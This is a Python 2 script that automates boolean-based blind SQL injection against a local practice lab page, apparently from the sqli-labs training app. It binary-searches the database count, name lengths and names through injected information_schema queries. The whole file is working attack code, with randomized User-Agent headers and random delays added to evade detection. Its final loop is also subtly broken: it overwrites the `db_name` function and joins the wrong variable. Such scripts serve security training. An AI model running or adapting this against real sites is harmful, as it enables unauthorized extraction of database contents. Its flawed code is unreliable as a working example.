#-*-coding:utf8-*-
# user_agent(random) | time.sleep(random.uniform())
from fake_useragent import UserAgent
import requests,time
import random,sys

ua = UserAgent()
url = "http://127.0.0.1:8000/Less-8/index.php?id=1"
def db_count(left,right):
    print '\r\n-------------------------开始获取数据库数量--------------------------\r\n'
    while 1:
        mid = (left + right)/2
        if mid == left:
            break
        payload = "\' and (select(select count(schema_name) from information_schema.schemata))<%s"% (mid) + "%23"
        headers={"User-Agent":ua.random}
        res = requests.get(url+payload,headers=headers)
        if 'You are in' in res.text:
            right = mid
            print "[*] trying payload: " + payload
        else:
            left = mid
            print "[*] trying payload: " + payload
        time.sleep(random.uniform(0.1,0.5))
    return mid
def db_name(left, right, index,dbnum):
    while 1:
        mid = (left + right)/2
        if mid == left:
            ok = chr(mid)
            break
        payload = '\' and(select ascii(substr((select schema_name from information_schema.schemata limit '+ str(dbnum) + ',1),%s,1)))<%s'% (str(index), str(mid)) + '%23'
        headers={"User-Agent":ua.random}
        res = requests.get(url+payload,headers=headers)
        if 'You are in' in res.text:
            right = mid
            print "[*] trying payload: " + payload
        else:
            left = mid
            print "[*] trying payload: " + payload
        time.sleep(random.uniform(0.1,0.5))
    return ok
def db_len(left,right,dbnum):
    print "\r\n--------------------开始猜解第(%s)个数据库名长度----------------------\r\n"% (str(dbnum+1))
    while 1:
        mid = (left + right)/2
        if mid == left:
            break
        lens_payload = '\' and (select length(schema_name) from information_schema.schemata limit '+ str(dbnum) +',1)<%s'% (str(mid)) +'%23'
        headers={"User-Agent":ua.random}
        res = requests.get(url+lens_payload,headers=headers)
        if 'You are in' in res.text:
            right = mid
            print "[*] trying payload: " + lens_payload
        else:
            left = mid
            print "[*] trying payload: " + lens_payload
        time.sleep(random.uniform(0.1,0.5))
    return mid

if __name__ == "__main__":
    ua = UserAgent()
    url = "http://127.0.0.1:8000/Less-8/index.php?id=1"
    if len(sys.argv)>1 and sys.argv[1] == 'db_name':
        b = []
        database_count = db_count(1,35)
        print "\n-------------------存在注入，发现%s个数据库-----------------\n"% (database_count)
        time.sleep(1)
        for x in range(database_count):
            l = []
            time.sleep(1)
            a = db_len(1,30,x)
            print "第"+str(x+1)+"数据库名长度为："+str(a)+'\r\n\r\n'
            print '\r\n-------------------------开始猜解第('+str(x+1) +')个库名---------------------------\r\n'
            for i in range(1,a+1):
                f = db_name(33, 127, i,x)
                l.append(f)
                print l
            db_name = ''.join(f)
            print db_name
            b.append(db_name)
        print "\n------databases------\n" 
        print '\n'.join(b)+'\n'